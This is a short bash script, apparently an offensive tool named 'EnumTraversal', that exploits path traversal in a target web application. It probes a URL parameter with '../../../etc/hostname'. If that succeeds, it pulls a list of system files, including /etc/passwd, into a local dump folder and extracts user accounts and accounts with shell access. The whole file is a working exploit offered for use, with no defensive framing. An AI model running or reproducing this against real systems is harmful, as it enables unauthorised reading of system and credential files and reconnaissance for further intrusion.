#!/bin/bash

clear

BannerFunction(){
	echo "		+==================================================+"
	echo "		|			                EnumTraversal                  |"
	echo "		|	           dTMP3st - Cyber Strike Force	         |"
	echo "		|	   	              Version - 1.0                  |"
	echo "		+==================================================+"
}

if [ "$1" == "" ]; then
    BannerFunction
    echo "Use mode: $0 Target"
else
    BannerFunction
    echo ""
    wget --quiet $1=../../../etc/hostname -O Validation.txt
    Validation=$(cat Validation.txt)
    rm Validation.txt
    Path=$(echo "$1" | cut -d "/" -f3)
    mkdir Dump/$Path
    if [ "$Validation" != "" ]; then
        echo "The application is vulnerable to Path traversal"
        echo ""
        echo "[+] Starting the operating system enumeration process"
        echo ""
        for Enumeration in $(cat Paths.txt); do
            Enumeration=$(echo "$Enumeration" | cut -d "." -f7)
            echo "  [*] Exfiltrating information from the $Enumeration path"
            Dump=$(echo "$Enumeration" | cut -d "/" -f5)
            wget --quiet $1=$Enumeration -O $Dump.txt
            mv $Dump.txt Dump/$Path
        done
        echo ""
        echo "  [*] Enumerated system user:"
        System_User=$(cat Dump/$Path/passwd.txt)
        echo "$System_User" | grep "/home" | cut -d ":" -f1
        echo "  [*] Enumerated system users that contain shell access"
        echo "$System_User" | grep "/bin/bash" | cut -d ":" -f1
        echo ""
        echo "  [*] Binaries feature on target"
        echo "  [*] Network configuration"
        echo "  [*] Operating system structure"
        echo "  [*] Web Server files"
    else
        echo "The application is not vulnerable to Path traversal"
    fi
fi